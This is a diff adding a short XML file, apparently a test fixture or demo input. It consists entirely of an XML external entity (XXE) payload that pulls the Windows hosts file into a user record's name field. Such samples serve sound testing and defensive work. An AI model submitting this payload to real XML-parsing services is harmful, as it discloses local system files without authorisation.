@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE user [ 
+    <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts"> 
+]>
+<user>
+    <id>101</id>
+    <name>&xxe;</name>
+    <email>vulnerable@example.com</email>
+</user>
